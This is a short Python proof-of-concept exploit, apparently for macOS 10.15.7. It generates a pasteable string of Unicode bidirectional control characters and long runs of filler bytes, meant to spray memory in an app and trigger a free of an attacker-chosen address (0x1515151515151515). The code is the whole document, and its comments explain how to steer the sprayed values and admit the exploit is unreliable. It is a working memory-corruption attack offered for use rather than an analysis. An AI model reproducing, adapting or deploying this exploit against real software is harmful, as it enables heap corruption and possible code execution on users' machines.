# python3 poc.py | pbcopy
# paste into app
# profit
#
# super stable PoC
# works about 10% of the time if you're lucky
#
# should free 0x1515151515151515
# it like sprays that in a similar location to the free list, and sometimes ends up freeing it
# for a more controlled free you might have to find each of the 256 values (i haven't yet), and substitute them
# example: 0x41 becomes 0x15, and 0xffff becomes 0x4
# so if you spray "\x41\x41\uffff\x41\uffff\uffff\uffff\uffff" it'll spray 0x1515041504040404, maybe something else because endianess but fuck you, whatever
# also there's like an offset of 0x2 or something
# i add "\uffff\uffff" at the start which seems to pad it for the address to work right
# it's vaguely functional, and should at least prove the bug exists
# note: this may have been patched in some big sur version (or 11.0 itself)
# run on 10.15.7, it's been tested there.

import sys

def lol(l2):
	s = ""
	a = ["\u202a", "\u202b", "\u202c", "\u202d", "\u202e", "\u202f"]
	b = []
	for i in a:
		for j in a:
			b += i + j
	for i in range(l2):
		s += b[i % (len(b))]
		c  = "\x41" * 0x8000
		if i == 6:
			s += c
		else:
			s += "\1"
	return s

print(lol(18))
